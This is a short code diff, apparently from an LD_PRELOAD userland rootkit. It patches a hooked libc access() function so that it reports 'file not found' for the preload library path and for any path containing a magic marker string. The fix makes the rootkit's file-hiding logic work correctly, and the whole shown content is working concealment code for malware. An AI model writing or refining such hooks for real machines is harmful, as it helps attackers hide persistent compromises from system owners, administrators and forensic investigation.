@@ -156,7 +156,7 @@ FILE* fopen64(const char *path, const char *mode) {
 
 int access(const char *path, int mode) {
     if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
-    if(strcmp(path, PRELOAD_PATH) || strstr(path, MAGIC_STRING)) {
+    if(strcmp(path, PRELOAD_PATH) == 0 || strstr(path, MAGIC_STRING) != NULL) {
         errno = ENOENT;
         return -1;
     }
